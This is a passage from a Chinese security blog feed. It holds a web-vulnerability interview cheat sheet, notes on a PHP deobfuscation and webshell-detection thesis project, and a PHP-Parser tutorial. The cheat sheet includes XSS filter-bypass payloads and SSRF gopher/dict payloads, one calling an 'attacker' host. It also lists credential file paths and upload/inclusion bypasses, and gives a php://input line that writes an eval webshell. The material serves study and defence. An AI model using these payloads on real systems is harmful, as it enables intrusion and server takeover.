onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"&gt;        ascii码绕过：&lt;img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))"&gt;        base64绕过：&lt;img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"&gt;3.过滤单双引号    编码绕过    使用反引号：&lt;img src="x" onerror=alert(`xss`);&gt;4.其他    使用中文标点    使用IP</code></pre><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h3><pre><code>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作</code></pre><h3 id="CSRF的预防"><a href="#CSRF的预防" class="headerlink" title="CSRF的预防"></a>CSRF的预防</h3><pre><code>1.当用户发送重要的请求时输入验证码2.涉及随机TOKEN ---数据包的唯一值3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）4.设置验证码5.限制请求方式只能为post0</code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="SSRF形成的原因"><a href="#SSRF形成的原因" class="headerlink" title="SSRF形成的原因"></a>SSRF形成的原因</h3><pre><code>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 </code></pre><h3 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h3><pre><code>1.使用Enclosed alphanumerics编码2.[::]绕过3.@example绕过 http://example.com@127.0.0.14.127.0.0.1 =&gt; 127.1 =&gt; http://0/5.短域名绕过6..xip.io绕过7.IP进制转换8.利用句号 127。0。0。1 =&gt; 127.0.0.19.利用协议    Dict://    dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;    ssrf.php?url=dict://attacker:11111/      SFTP://  ssrf.php?url=sftp://example.com:11111/    TFTP://  ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET    LDAP://  ssrf.php?url=ldap://localhost:11211/%0astats%0aquit    Gopher://  ssrf.php?     url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</code></pre><h3 id="SSRF的利用方式"><a href="#SSRF的利用方式" class="headerlink" title="SSRF的利用方式"></a>SSRF的利用方式</h3><pre><code>1.让服务端去访问相应的网址2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）5.攻击内网应用程序（利用跨协议通信技术）6.判断内网主机是否存活：方法是访问看是否有端口开放7.DoS攻击（请求大文件，始终保持连接keep-alive always）</code></pre><h3 id="SSRF预防"><a href="#SSRF预防" class="headerlink" title="SSRF预防"></a>SSRF预防</h3><pre><code>1.禁止跳转2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）5.限制请求的端口为http常用的端口，比如 80、443、8080、80906.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</code></pre><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><h3 id="水平越权和垂直越权"><a href="#水平越权和垂直越权" class="headerlink" title="水平越权和垂直越权"></a>水平越权和垂直越权</h3><pre><code class="plaintextp">水平越权：        水平越权通常是获得同级别用户的权限，可以访问到同级别用户的数据垂直越权：        垂直越权又叫权限攻击，是获得高于自己当权角色权限的账户的权限。</code></pre><p><img src="https://pic2.zhimg.com/v2-5fefd7bec4b78cc29fd64643ed46cd50_1440w.jpg?source=172ae18b" alt="越权漏洞原理及防御方案"></p><h3 id="越权漏洞通常出现的位置"><a href="#越权漏洞通常出现的位置" class="headerlink" title="越权漏洞通常出现的位置"></a>越权漏洞通常出现的位置</h3><pre><code>订单界面修改用户信息界面用户信息查询界面等通过ID或者文件名等参数进行交互的地方</code></pre><h3 id="越权漏洞预防措施"><a href="#越权漏洞预防措施" class="headerlink" title="越权漏洞预防措施"></a>越权漏洞预防措施</h3><pre><code>前后端同时对用户输入信息进行校验，双重验证机制调用功能前验证用户是否有权限调用相关功能执行关键操作验证用户身份，验证是否有操作数据的权限直接对象引用的资源ID，防止攻击者枚举ID，敏感数据特殊化处理对可控参数进行严格的检查和过滤</code></pre><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="常用绕过手法"><a href="#常用绕过手法" class="headerlink" title="常用绕过手法"></a>常用绕过手法</h3><pre><code>客户端    js检查服务端    检查后缀    黑名单    上传特殊可解析后缀    上传.htaccess    上传.user.ini    后缀大小写绕过    点绕过    空格绕过    ::$DATA配合解析漏洞    Apache HTTPD 换行解析漏洞（CVE-2017-15715）    Apache HTTPD 多后缀解析漏洞    Nginx 解析漏洞    IIS7.5解析漏洞    IIS6解析漏洞    双后缀名绕过    白名单    MIME绕过    %00截断    0x00截断（白名单、上传路径可控、php.ini中的magic_quotes_gpc为off）    0x0a截断（php版本&lt;5.3.4、php.ini中的magic_quotes_gpc设置为off、上传路径可控、白名单）    检查内容    文件头检查    突破getimagesize()    突破exif_imagetype()    二次渲染    其他    条件竞争</code></pre><h3 id="PHP爆绝对路径的方法"><a href="#PHP爆绝对路径的方法" class="headerlink" title="PHP爆绝对路径的方法"></a>PHP爆绝对路径的方法</h3><pre><code>单引号爆路径错误参数值爆路径Google 爆路径:Site:xxx.edu.tw warning测试文件爆路径（test.php、1.php、ceshi.php、info.php）phpmyadmin 爆路径:/phpmyadmin/libraries/lect_lang.lib.php配置文件找路径</code></pre><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="PHP中文件包含函数及其特点"><a href="#PHP中文件包含函数及其特点" class="headerlink" title="PHP中文件包含函数及其特点"></a>PHP中文件包含函数及其特点</h3><pre><code>require()require_once()include()include_once()include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题</code></pre><h3 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h3><pre><code>Windows系统c:\boot.ini // 查看系统版本c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件c:\windows\repair\sam // 存储Windows系统初次安装的密码c:\ProgramFiles\mysql\my.ini // MySQL配置c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码c:\windows\php.ini // php 配置信息Linux/Unix系统/etc/passwd // 账户信息/etc/shadow // 账户密码文件/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置/usr/local/app/php5/lib/php.ini // PHP相关配置/etc/httpd/conf/httpd.conf // Apache配置文件/etc/my.conf // mysql 配置文件</code></pre><h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><pre><code>利用条件：1.session的存储位置可以获取  可以通过phpinfo查看  可以进行猜测路径，如linux下默认存储在/var/lib/php/session目录下2.session中的内容可以被控制，传入恶意代码</code></pre><h3 id="文件包含常用绕过"><a href="#文件包含常用绕过" class="headerlink" title="文件包含常用绕过"></a>文件包含常用绕过</h3><pre><code>%00截断绕过    magic_quotes_gpc = Off php版本&lt;5.3.4路径长度截断    windows OS，点号需要长于256；linux OS 长于4096./绕过去后缀名绕过问号绕过#号绕过</code></pre><h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><pre><code class="php">1.php://filter（本地磁盘文件进行读取）    用法：?filename=php://filter/convert.base64-encode/resource=xxx.php2.php://input （读取POST数据）    用法：POST写入木马&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;3.file://伪协议 （读取文件内容）    用法：file://c:/boot.ini4.data://(读取文件)    用法：data://text/plain;base64,SSBsb3ZlIFBIUAo=5.phar://（压缩文件读取）    用法：?file=phar://压缩包/内部文件</code></pre><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><pre><code>代码执行函数：eval、assert、call_user_func、create_function、array_map命令执行函数：system、passthru、exec、pcntl_exec、shell_exec、popen()</code></pre><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><pre><code>1.尽量少用执行命令的函数或者直接禁用2.参数值尽量使用引号包括3.在使用动态函数之前，确保使用的函数是指定的函数之一4.在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义5.能使用脚本解决的工作，不要调用其他程序处理。尽量少用执行命令的函数，并在disable_functions中禁用6.对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤7.参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义而针对由特定第三方组件引发的漏洞，我们要做的就是及时打补丁，修改安装时的默认配置。</code></pre><h2 id="常见web漏洞原理、防御办法"><a href="#常见web漏洞原理、防御办法" class="headerlink" title="常见web漏洞原理、防御办法"></a>常见web漏洞原理、防御办法</h2><pre><code>1.SQL注入    原理：数据与代码未分离    防御：    waf    使用预编译语句，绑定变量    检查数据类型，例如限制输入数据只能为int    使用安全函数,encodeForSQL()    最小权限原则，避免直接使用root2.XSS    原理：    防御：    在Cookie中设置HttpOnly标识,禁止页面的js访问带有httponly属性的cookie    XSS Filter：过滤用户输入的危险字符，设置黑白名单    输出检查：编码和转义，常用编码：html编码、url编码、js编码、16进制、base64等，使得浏览器无法解析执行js代码    针对不同位置的输出，使用不同的处理方式    处理富文本:限制用户能使用的标签，限制为只能使用a、div等安全的标签    header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）3.CSRF    原理：通过伪装来自受信任用户的请求来利用受信任的网站,例如：用户登录某账户，浏览器获得cookie；攻击者诱使用户访问某构造好的恶意CSRF页面。    防御：    验证码    Referer Check（HTTPS跳转到HTTP不会发送Referer）    Anti CSRF Token4.SSRF    原理：利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制，一般用来在外网探测或攻击内网服务    防御：    对url参数进行过滤，过滤返回信息    限制请求端口为http常用的端口    内网IP黑名单    禁用不需要的协议5.XXE    原理：应用程序解析XML输入时，没有禁止DTD引用外部实体的加载，导致可加载恶意外部文件    防御：    使用开发语言提供的禁用外部实体的方法    过滤用户提交的XML数据，过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。6.文件上传    原理：没有对上传文件进行过滤导致用户可以上传shell    防御：        文件扩展名服务端白名单校验。        文件内容服务端校验。        上传文件重命名。        隐藏上传文件路径。        文件上传的目录设置为不可执行        单独设置文件服务器的域名</code></pre><pre><code>1.IIS  6.x 解析漏洞    .asp文件夹下的文件会解析为asp    .asp;.jpg文件会被解析为asp  7.x 解析漏洞      .jpg后加上/.php会将jpg文件解析为php  PUT任意文件写入      开启WevDav之后如果有写入权限会造成任意文件写入  短文件名猜解2.Apache  未知后缀解析漏洞      .php.xxx1.xxx2，从右往左解析  后缀换行漏洞      1.php/%0A会被解析为php  ADDhandle配置错误 配置处理器3.Nginx  配置错误导致解析漏洞/.php  空字符任意命令执行  文件名逻辑漏洞      文件名后加空格  配置错误      目录穿越:配置alias的时候没有/      目录遍历：autoindex=o      LR注入漏洞：url解析换行4.tomcat  弱口令  远程代码执行：函数在windows上和linux的实现不同</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;收集一些常见的信息安全面试问题&lt;/p&gt;</summary>
    
    
    
    
    <category term="面经" scheme="https://rainsec.cn/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHP_Deobf源码分析</title>
    <link href="https://rainsec.cn/post/PHP_deobf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/PHP_deobf%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</id>
    <published>2022-02-22T03:47:47.000Z</published>
    <updated>2022-07-14T08:10:50.923Z</updated>
    
    <content type="html"><![CDATA[<p>分析一下毕设的参考项目于源码</p><span id="more"></span><h1 id="PHP-deobf源码分析"><a href="#PHP-deobf源码分析" class="headerlink" title="PHP_deobf源码分析"></a>PHP_deobf源码分析</h1><p>因为毕设主要依托于这个(<del>不是直接down了交嗷</del>)</p><p>所以近期要分析一下这个项目对于各种混淆的处理方式</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;分析一下毕设的参考项目于源码&lt;/p&gt;</summary>
    
    
    
    
    <category term="安全开发" scheme="https://rainsec.cn/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    <category term="源码分析" scheme="https://rainsec.cn/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
    <category term="毕业设计" scheme="https://rainsec.cn/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>W9scan源码分析</title>
    <link href="https://rainsec.cn/post/W9scan%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/W9scan%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</id>
    <published>2022-02-22T03:45:45.000Z</published>
    <updated>2022-07-14T08:10:50.927Z</updated>
    
    <content type="html"><![CDATA[<p>分析漏洞扫描器W9scan的源码，准备入坑安全开发？？</p><span id="more"></span><h1 id="W9scan源码分析"><a href="#W9scan源码分析" class="headerlink" title="W9scan源码分析"></a>W9scan源码分析</h1><p>目前准备稍微入坑一下Python安全开发，准备从w9scan的源码入手开始学习，这个用来记录源码学习</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;分析漏洞扫描器W9scan的源码，准备入坑安全开发？？&lt;/p&gt;</summary>
    
    
    
    
    <category term="安全开发" scheme="https://rainsec.cn/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    <category term="源码分析" scheme="https://rainsec.cn/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>毕设项目:基于PHP-Parser进行反混淆与检测的规划</title>
    <link href="https://rainsec.cn/post/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E3%81%AE%E6%83%B3%E6%B3%95.html"/>
    <id>https://rainsec.cn/post/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E3%81%AE%E6%83%B3%E6%B3%95.html</id>
    <published>2022-02-10T12:00:00.000Z</published>
    <updated>2022-07-14T08:10:50.927Z</updated>
    
    <content type="html"><![CDATA[<p>对于自己的毕设的一些功能的想法和未来该怎么做的一些规划</p><span id="more"></span><h1 id="毕设项目-基于PHP-Parser的反混淆"><a href="#毕设项目-基于PHP-Parser的反混淆" class="headerlink" title="毕设项目-基于PHP-Parser的反混淆"></a>毕设项目-基于PHP-Parser的反混淆</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。</p><p>目前是没考虑过机器学习，后续可能会使用吧(<del>maybe</del></p><h2 id="反混淆"><a href="#反混淆" class="headerlink" title="反混淆"></a>反混淆</h2><p>PHP-Parser基础来源于FeatureExtract中积累的操作</p><p>根据Github上的反混淆项目和Deof项目进行改造，尽量理解两个项目的运行方式以及对待不同混淆时的操作</p><h3 id="Deobf"><a href="#Deobf" class="headerlink" title="Deobf"></a>Deobf</h3><p>编写比较有逻辑，整体框架一目了然，对应文件的功能比较清晰</p><p>但是现在功能不够全，对于一些情况目前无法处理，比如</p><pre><code class="php">&lt;?php $z0=$_REQUEST['sort'];$q1='';$c2="wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);foreach($y3 as $h4) {    $q1.=$c2[$h4];}$v5=strrev("noi"."tcnuf"."_eta"."erc");$j6=$v5("",$q1($z0));$j6();?&gt;</code></pre><p>在<code>$j6=$v5("",$q1($z0));</code>这里不能直接反混淆出v5的值</p><p>还有一些其他的功能没有实现，只实现了基础的反混淆，不过因为骨架已经搭好，未来应该在该项目基础上进行编写</p><h3 id="一些常用的反混淆操作"><a href="#一些常用的反混淆操作" class="headerlink" title="一些常用的反混淆操作"></a>一些常用的反混淆操作</h3><h4 id="字符串函数直接返回值"><a href="#字符串函数直接返回值" class="headerlink" title="字符串函数直接返回值"></a>字符串函数直接返回值</h4><p>这里以base64_decode为例，后续可以把字符串操作函数放在数组里然后进行判断</p><pre><code class="php">function leavenode($node){    if($node instanceof PhpParser\Node\Expr\FuncCall &amp;&amp; $node-&gt;name-&gt;parts[0] == "base64_decode"){        return new PhpParser\Node\Scalar\String_($node-&gt;name-&gt;parts[0]($node-&gt;args[0]-&gt;value-&gt;value));    }}//例子如下&lt;?phpbase64_decode("UEhQLVBhcnNlcg");--After parser:--    &lt;?php'PHP-Parser';</code></pre><h4 id="字符操作函数传递给变量然后动态调用"><a href="#字符操作函数传递给变量然后动态调用" class="headerlink" title="字符操作函数传递给变量然后动态调用"></a>字符操作函数传递给变量然后动态调用</h4><p>这个目前我没有啥好的想法，我的做法是设置两个Visitor，第一个Visitor遍历到函数声明的时候把函数名和函数值存在一个static数组里，第二个Visitor为进行操作的，当遍历到$node为函数调用时，去数组里进行查询，返回对应变量的值，然后返回成String_节点</p><p>目前只写了针对单字符编码的测试，还有的函数需要多个参数，参数可能为字符也可能为变量，这里后续要考虑(初级想法是argv[]依次取出通过循环拼接命令，后续进行尝试)，还有要设计数据结构，变量可以给变量复制，是不是可以使用链表进行操作，终点指向字符串等。</p><pre><code class="php">Class StrVisitor extends NodeVisitorAbstract{    public function __construct()    {        $this-&gt;variable = new Variable;    }    function leavenode($node){        if($node instanceof PhpParser\Node\Expr\Assign &amp;&amp; $node-&gt;var instanceof PhpParser\Node\Expr\Variable &amp;&amp; $node-&gt;expr instanceof PhpParser\Node\Scalar\String_) {            $this-&gt;variable-&gt;pushvariable($node-&gt;var-&gt;name,$node-&gt;expr-&gt;value);        }    }    function afterTraverse(array $nodes)    {        $this-&gt;variable-&gt;output();    }}Class FuncVisitor extends NodeVisitorAbstract{    public function __construct()    {        $this-&gt;variable = new Variable;    }    function leavenode($node){        if($node instanceof PhpParser\Node\Expr\FuncCall &amp;&amp; $node-&gt;name instanceof PhpParser\Node\Expr\Variable) {            $value = $node-&gt;args[0]-&gt;value-&gt;value;            $name = $this-&gt;variable-&gt;popvariable($node-&gt;name-&gt;name);            if($name){                return new Node\Scalar\String_($name($value));            }        }    }}Class Variable{    static $variablelist = [];    public function pushvariable($variablename,$variablevalue){        self::$variablelist[$variablename] = $variablevalue;    }    public function popvariable($variablename){        if(isset(self::$variablelist[$variablename])){            return self::$variablelist[$variablename];        }else{            return 0;        }    }    public function output(){        var_dump(self::$variablelist);    }}</code></pre><p>测试如下</p><pre><code class="php">&lt;?php$a = 'base64_decode';$b = 'str_rot13';$c = 'chr';$d = 'strtolower';$d('@_POST');$c(97);$b('CUC-Cnefre');--After parser:--&lt;?php$a = 'base64_decode';$b = 'str_rot13';$c = 'chr';$d = 'strtolower';'@_post';'a';'PHP-Parser';</code></pre><p>针对preg_replace这种多参数函数，php_deobf可以进行混淆出来，后续看一下怎么实现的<br><del>这里挖个坑，每天补一点</del></p><h2 id="Yara"><a href="#Yara" class="headerlink" title="Yara"></a>Yara</h2><p>Yara规则依靠于积累的规则和开源项目例如</p><p><a href="https://github.com/ruppde/yara_rules/blob/f375dbafa7b6aabd4e8fe8506a9e3ab9b8a57cbd/webshell/gen_webshells.yar">yara_rules/gen_webshells.yar</a></p><p>目前的想法是将工作的重点放在反混淆上，因为如果能将反混淆做的尽量彻底，那么规则就会很好写。</p><h2 id="两者结合"><a href="#两者结合" class="headerlink" title="两者结合"></a>两者结合</h2><p>做一个后端或者直接在反混淆结束之后添加</p><pre><code class="php">system("yara -r webshell/rule webshell/sample");</code></pre><p>如果有时间还是想做一个好看的后端</p><h2 id="短期要做的事"><a href="#短期要做的事" class="headerlink" title="短期要做的事"></a>短期要做的事</h2><ul><li>看一下**<a href="https://github.com/L2ksy0d/PHPDeobfuscator">PHPDeobfuscator</a>**是怎么解决变量值的存储和后续替换的(目前的想法是如果遍历到遍历声明或者变量赋值，就把变量名和值传给一个数组，当后续遇到变量被调用时从数组调值进行替换，明天试试)</li><li>将Deobf当前的功能理清楚然后将目前已经可以做的补充进去</li><li>调研一下后端的建设情况</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;对于自己的毕设的一些功能的想法和未来该怎么做的一些规划&lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP-Parser" scheme="https://rainsec.cn/tags/PHP-Parser/"/>
    
  </entry>
  
  <entry>
    <title>PHP-Parser的基本使用</title>
    <link href="https://rainsec.cn/post/PHP-Parser.html"/>
    <id>https://rainsec.cn/post/PHP-Parser.html</id>
    <published>2022-01-28T11:45:34.000Z</published>
    <updated>2022-07-15T11:35:51.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-Parser"><a href="#PHP-Parser" class="headerlink" title="PHP-Parser"></a>PHP-Parser</h1><p>PHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。</p><span id="more"></span><h2 id="What-is-PHP-Parser"><a href="#What-is-PHP-Parser" class="headerlink" title="What is PHP-Parser"></a>What is PHP-Parser</h2><p><code>PHP-Parser</code>是<code>nikic</code>用PHP编写的PHP5.2到PHP7.4解析器，其目的是简化静态代码分析和操作</p><h2 id="PHP-Parser的基础使用"><a href="#PHP-Parser的基础使用" class="headerlink" title="PHP-Parser的基础使用"></a>PHP-Parser的基础使用</h2><p>这里先贴一下官方文档</p><p><a href="https://github.com/nikic/PHP-Parser/tree/master/doc">PHP-Parser/doc at master · nikic/PHP-Parser (github.com)</a></p><p>最基本的是要理解其中<a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Walking_the_AST.markdown">Walking the AST</a>的部分</p><h2 id="初始化解析器"><a href="#初始化解析器" class="headerlink" title="初始化解析器"></a>初始化解析器</h2><p>首先创建实例</p><pre><code class="php">use PhpParser\ParserFactory;$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</code></pre><p>这其中有以下参数</p><p>KindBehaviorParserFactory::PREFER_PHP7Try to parse code as PHP 7. If this fails, try to parse it as PHP 5.ParserFactory::PREFER_PHP5Try to parse code as PHP 5. If this fails, try to parse it as PHP 7.ParserFactory::ONLY_PHP7Parse code as PHP 7.ParserFactory::ONLY_PHP5Parse code as PHP 5.</p><p>create还有一个参数Lexer，这里先不做讨论</p><p>在实例化之后我们就可以通过</p><pre><code class="php">$stmts = $parser-&gt;parse($code);</code></pre><p>来将代码转换成AST</p><p>为了防止抛出异常，最好在try….catch中执行</p><h3 id="生成更加直观的AST"><a href="#生成更加直观的AST" class="headerlink" title="生成更加直观的AST"></a>生成更加直观的AST</h3><p>当我们var_dump上面的$stmt时，会得到一个比较乱的AST，可以使用NodeDump将其转化为更加直观的AST</p><p>这里需要使用NodeDump</p><p>对于代码</p><pre><code class="PHP">&lt;?phpfunction printLine($msg) {    echo $msg, "\n";}printLine('Hello World!!!');</code></pre><p>将其转换为AST</p><pre><code class="PHP">&lt;?phpuse PhpParser\NodeDumper;$nodeDumper = new NodeDumper;echo $nodeDumper-&gt;dump($stmts), "\n";</code></pre><p>得到以下输出</p><pre><code class="YAML">array(    0: Stmt_Function(        byRef: false        name: Identifier(            name: printLine        )        params: array(            0: Param(                type: null                byRef: false                variadic: false                var: Expr_Variable(                    name: msg                )                default: null            )        )        returnType: null        stmts: array(            0: Stmt_Echo(                exprs: array(                    0: Expr_Variable(                        name: msg                    )                    1: Scalar_String(                        value:                    )                )            )        )    )    1: Stmt_Expression(        expr: Expr_FuncCall(            name: Name(                parts: array(                    0: printLine                )            )            args: array(                0: Arg(                    value: Scalar_String(                        value: Hello World!!!                    )                    byRef: false                    unpack: false                )            )        )    ))</code></pre><h3 id="Node-tree-structure"><a href="#Node-tree-structure" class="headerlink" title="Node tree structure"></a>Node tree structure</h3><p>上面我们可以看到生成了很多的Node类型</p><p>PHP是一个成熟的脚本语言，它大约有140个不同的节点。但是为了方便使用，将他们分为三类：</p><ul><li><p><code>PhpParser\Node\Stmts</code>是语句节点，即不返回值且不能出现在表达式中的语言构造。例如，类定义是一个语句，它不返回值，你不能编写类似func(class {})的语句。</p></li><li><p><code>PhpParser\Node\expr</code>是表达式节点，即返回值的语言构造，因此可以出现在其他表达式中。如：<code>$var (PhpParser\Node\Expr\Variable)</code>和<code>func() (PhpParser\Node\Expr\FuncCall)</code>。</p></li><li><p><code>PhpParser\Node\Scalars</code>是表示标量值的节点，如<code>"string" (PhpParser\Node\scalar\string)</code>、<code>0 (PhpParser\Node\scalar\LNumber)</code> 或魔术常量，如”<strong>FILE</strong>“ <code>(PhpParser\Node\scalar\MagicConst\FILE)</code> 。所有<code>PhpParser\Node\scalar</code>都是延伸自<code>PhpParser\Node\Expr</code>，因为scalar也是表达式。</p></li><li><p>需要注意的是<code>PhpParser\Node\Name</code>和<code>PhpParser\Node\Arg</code>不在以上的节点之中</p></li></ul><h3 id="Pretty-printer"><a href="#Pretty-printer" class="headerlink" title="Pretty printer"></a>Pretty printer</h3><p>Prettyprinter用来将我们修改后的AST转换回PHP代码，使用如下</p><pre><code class="php">use PhpParser\Error;use PhpParser\ParserFactory;use PhpParser\PrettyPrinter;$code = "&lt;?php echo 'Hi ', hi\\getTarget();";$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$prettyPrinter = new PrettyPrinter\Standard;try {    //生成AST    $stmts = $parser-&gt;parse($code);    //对节点进行操作    $stmts[0]         // the echo statement          -&gt;exprs     // sub expressions          [0]         // the first of them (the string node)          -&gt;value     // it's value, i.e. 'Hi '          = 'Hello '; // change to 'Hello '    // pretty print    $code = $prettyPrinter-&gt;prettyPrint($stmts);    echo $code;} catch (Error $e) {    echo 'Parse Error: ', $e-&gt;getMessage();}</code></pre><p>在反混淆中我们一般很少使用$stmts[0]这种方式，因为我们要考虑节点的各种类型</p><p>此外还有prettyPrintExpr()，它可以用来输出一个表达式类型的节点</p><p>例如当你需要提取全局变量时</p><pre><code class="PHP">&lt;?php    $a = $_POST['a'];</code></pre><p>他的语法树如下</p><pre><code class="YAML">0: Stmt_Expression(        expr: Expr_Assign(            var: Expr_Variable(                name: a            )            expr: Expr_ArrayDimFetch(                var: Expr_Variable(                    name: _POST                )                dim: Scalar_String(                    value: a                )            )        )    )</code></pre><p>如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是<code>Expr_ArrayDimFetch</code></p><p>然后判断<code>$node-&gt;var-&gt;name</code>是不是全局变量</p><p>最后提取<code>$node-&gt;var-&gt;name</code>和<code>$node-&gt;dim-&gt;value</code>然后将它们拼接</p><p>当我的全局变量为<code>$_POST[a]</code>时，dim部分的AST也会变化，我们还需要考虑这种情况。</p><p>但是我们可以使用</p><pre><code class="PHP">/*    用来识别全局变量;    如果要获取全局变量格式无需考虑value的节点类型    expr: Expr_ArrayDimFetch(            var: Expr_Variable(                name: _POST            )    )*/        if ($node instanceof Node\Expr\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\Expr\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR)))        {            self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);        }</code></pre><p>其中</p><pre><code class="PHP">$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);</code></pre><p>就会返回该Expr节点的表达式，无论是<code>$_POST['a']</code>还是<code>$_POST[a]</code>都可以正常返回</p><p><a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Pretty_printing.markdown">PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com)</a></p><h2 id="Node-traversation"><a href="#Node-traversation" class="headerlink" title="Node traversation"></a>Node 